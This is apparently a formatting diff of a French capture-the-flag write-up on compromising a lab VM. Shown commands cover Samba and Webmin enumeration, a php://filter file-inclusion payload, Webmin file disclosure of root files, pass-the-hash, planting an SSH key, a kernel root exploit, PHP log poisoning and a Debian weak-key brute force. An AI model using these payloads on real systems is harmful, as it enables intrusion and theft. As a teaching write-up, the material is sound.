@@ -10,7 +10,7 @@ apropos
 
 On découvre de nombreux services présents : SSH, Apache, Samba et un Webmin.  
 
-```plain
+```
 Nmap scan report for 192.168.1.27
 Host is up (0.00013s latency).
 Not shown: 65530 closed ports
@@ -60,7 +60,7 @@ Faisons tout de même un tour du côté du *Samba* pour voir si on trouve quelqu
 whereis samba (in the kitchen ?)
 --------------------------------
 
-```plain
+```
 $ nmblookup -A 192.168.1.27
 Looking up status of 192.168.1.27
         UBUNTUVM        <00> -         H <ACTIVE> 
@@ -96,7 +96,7 @@ Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
 
 On tente d’accéder au partage via une connexion anonyme mais l'accès est refusé :  
 
-```plain
+```
 $ smbclient -I 192.168.1.27 -U "" -N //UBUNTUVM/home
 Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
 tree connect failed: NT_STATUS_ACCESS_DENIED
@@ -106,7 +106,7 @@ tree connect failed: NT_STATUS_ACCESS_DENIED
 
 En revanche le module pour énumérer les utilisateurs donne de bons résultats.  
 
-```plain
+```
 msf auxiliary(smb_enumusers) > set RHOSTS 192.168.1.27
 RHOSTS => 192.168.1.27
 msf auxiliary(smb_enumusers) > exploit
@@ -123,7 +123,7 @@ On décide alors de se tourner vers le site web qui est tout aussi minimaliste q
 
 L'index à la racine du site effectue une redirection via javascript sur laquelle *Wapiti* bute. Il suffit d'utiliser l'option -s pour lui donner un point de départ supplémentaire (output réduit) :  
 
-```plain
+```
 ./bin/wapiti http://192.168.1.27/ -s "http://192.168.1.27/index1.php?help=true&connect=true" -m "all,nikto,backup,htaccess"
 
 [+] Lancement du module file
@@ -148,7 +148,7 @@ Par exemple *dirb* a trouvé une installation *phpMyAdmin* dans */php/phpMyAdmin
 
 Cela peut être contourné bien l'utilisation de filtres qui convertissent les données avant l'inclusion :  
 
-```plain
+```
 connect=php://filter/convert.base64-encode/resource=php/phpMyAdmin/config.inc.php
 ```
 
@@ -183,7 +183,7 @@ Pour remplir ma liste de fichiers à tester je me suis basé sur un article de [
 
 L'output donne les résultats suivants pour les fichiers accessibles :  
 
-```plain
+```
 Acces a /var/log/lastlog ok
 Acces a /var/log/wtmp ok
 Acces a /var/run/utmp ok
@@ -215,7 +215,7 @@ Qui plus est, aucun accès a des clés SSH n'a été trouvé.
 
 Heureusement le */etc/passwd* nous donne quelques accounts supplémentaires, de quoi redonner espoir :  
 
-```plain
+```
 obama:x:1001:1001::/home/obama:/bin/bash
 osama:x:1002:1002::/home/osama:/bin/bash
 yomama:x:1003:1003::/home/yomama:/bin/bash
@@ -230,7 +230,7 @@ Webmin and 3 little monkeys
 
 Le module file\_disclosure de *Metasploit* va au delà de nos attentes puisqu'on voit ce que root voit :  
 
-```plain
+```
 msf> use auxiliary/admin/webmin/file_disclosure
 msf auxiliary(file_disclosure) > set RHOST 192.168.1.27
 RHOST => 192.168.1.27
@@ -275,7 +275,7 @@ L'autre méthode consiste à obtenir le hash dans une forme plus attaquable, c'e
 
 Pour cela on doit récupérer la base des utilisateurs Samba :  
 
-```plain
+```
 msfcli auxiliary/admin/webmin/file_disclosure RHOST=192.168.1.27 RPATH=/var/lib/samba/passdb.tdb E > /tmp/tdb
 ```
 
@@ -283,7 +283,7 @@ On la passe ensuite à un éditeur hexadécimal pour retirer l'output de *Metasp
 
 On doit recopier le fichier tdb sur son système pour que les outils Samba le retrouvent (je n'ai pas vu d'options pour spécifier un path particulier).  
 
-```plain
+```
 # cp /tmp/tdb /etc/samba/passdb.tdb
 # pdbedit -L -w
 vmware:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:FD64812D22B9B94638C2A7FF8C49DDC6:[U          ]:LCT-485138D9:
@@ -295,7 +295,7 @@ Encore mieux, on peut réutiliser le hash via la technique *pass-the-hash*, sauf
 
 *Impacket* a un script qui marche (plus ou moins) avec Samba (3rd monkey) :  
 
-```plain
+```
 python-impacket$ python examples/smbclient.py
 # open 192.168.1.27 445
 # login_hash vmware 00000000000000000000000000000000 FD64812D22B9B94638C2A7FF8C49DDC6
@@ -320,7 +320,7 @@ Accio shell !
 
 Dans tous les cas on arrive sur l'opération suivante qui consiste à récupérer le fichier *authorized\_keys* de l'utilisateur *vmware*, y ajouter notre clé publique et le renvoyer dans *.ssh* :  
 
-```plain
+```
 $ smbclient -I 192.168.1.27 -U vmware //UBUNTUVM/home
 Enter vmware's password: 
 Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
@@ -351,7 +351,7 @@ putting file authorized_keys as \.ssh\authorized_keys (779,2 kb/s) (average 779,
 
 On obtient alors notre shell tant attendu :  
 
-```plain
+```
 ssh vmware@192.168.1.27
 Enter passphrase for key 'id_rsa': 
 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
@@ -368,7 +368,7 @@ sudo accio shell !
 
 On récupère un exploit pour passer root. Ici [un exploit pour sock\_sendpage() qui utilise la présence de PulseAudio sur le système](http://www.exploit-db.com/exploits/9641/) :  
 
-```plain
+```
 vmware@ubuntuvm:~$ tar zxvf 2009-linux-sendpage3.tar.gz 
 linux-sendpage3/
 linux-sendpage3/sesearch-mmap_zero
@@ -393,7 +393,7 @@ J'ai tout de même jeté un œil sur les fichiers de logs pour voir si on pouvai
 
 Toutefois, admettons que les logs de Samba fussent lisibles on aurait d'abord remarqué que leur nom contient l'adresse IP ou le nom d'hôte du client (comme indiqué dans */etc/samba/smb.conf*) :  
 
-```plain
+```
 # This tells Samba to use a separate log file for each machine
 # that connects
    log file = /var/log/samba/log.%m
@@ -401,7 +401,7 @@ Toutefois, admettons que les logs de Samba fussent lisibles on aurait d'abord re
 
 Il aurait alors été possible d'injecter du PHP dans les logs en faisant appel à un partage inexistant :  
 
-```plain
+```
 $ smbclient -I 192.168.1.27  '//UBUNTUVM/<?php phpinfo(); ?>' -U "" -N
 ```
 
@@ -413,7 +413,7 @@ Pour faire court, cette faille permet de retrouver une clé privée valide à pa
 
 Un exmple sera plus parlant. On trouve [un exploit en Python sur exploit-db](http://www.exploit-db.com/exploits/5720/) :  
 
-```plain
+```
 $ python bkeys.py
 
 -OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
@@ -444,7 +444,7 @@ Tested 16654 keys | Remaining 16114 keys | Aprox. Speed 40/sec
 
 Copier / coller  
 
-```plain
+```
 $ ssh -lobama -p22 -i rsa/2048//dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.1.27
 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
 
